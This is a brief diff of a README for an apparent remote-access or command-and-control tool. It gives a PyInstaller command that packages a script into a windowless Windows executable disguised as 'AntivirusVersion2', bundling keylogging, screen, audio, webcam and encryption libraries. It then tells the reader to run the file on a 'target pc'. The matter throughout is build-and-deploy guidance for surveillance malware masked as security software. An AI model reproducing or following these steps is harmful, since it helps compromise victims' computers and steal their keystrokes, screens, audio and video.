@@ -73,7 +73,10 @@ pyinstaller --onefile --noconsole --name "AntivirusVersion2" c2beta.py
 ```bash
 pyinstaller --onefile --noconsole --name "AntivirusVersion2" --add-data "c2beta.py;." --hidden-import "ctypes" --hidden-import "win32api" --hidden-import "win32com" --hidden-import "Crypto" --hidden-import "Crypto.Cipher" --hidden-import "Crypto.Util" --hidden-import "psutil" --hidden-import "requests" --hidden-import "pynput" --hidden-import "mss" --hidden-import "sounddevice" --hidden-import "cv2" --collect-all "Crypto" --collect-all "cv2" --collect-all "pynput" --collect-all "mss" --collect-all "sounddevice" c2beta.py
 ```
+-  exe file in this folder --->  `dist/AntivirusVersion2.exe`
+
 - 6️⃣ Run  exe file , in target pc 🔥
+
 
 ##
 
